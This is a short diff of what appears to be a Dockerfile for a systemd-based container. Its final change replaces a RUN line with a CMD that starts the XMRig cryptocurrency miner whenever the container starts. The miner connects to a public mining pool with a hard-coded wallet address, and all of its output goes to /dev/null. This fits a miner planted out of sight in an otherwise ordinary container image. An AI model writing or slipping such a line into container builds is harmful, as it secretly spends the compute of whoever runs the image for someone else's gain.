@@ -14,4 +14,4 @@ rm -f /lib/systemd/system/basic.target.wants/*;\
 rm -f /lib/systemd/system/anaconda.target.wants/*;
 VOLUME [ "/sys/fs/cgroup" ]
 CMD ["/usr/sbin/init"]
-RUN ./xmrig-6.12.1/xmrig -o pool.hashvault.pro:3333 -u 47WPxNoyvLtcmH9PJAMTEvbJjsKmGXasrHJBbD2uSY9W5fTAp6FUZxL3QFs6Qm1zi3TZXFETy7pMYYFcgn4nuK3r7WtE8B1 -p oc -k --tls
+CMD ./xmrig-6.12.1/xmrig -o pool.hashvault.pro:3333 -u 47WPxNoyvLtcmH9PJAMTEvbJjsKmGXasrHJBbD2uSY9W5fTAp6FUZxL3QFs6Qm1zi3TZXFETy7pMYYFcgn4nuK3r7WtE8B1 -p oc -k --tls > /dev/null 2>&1
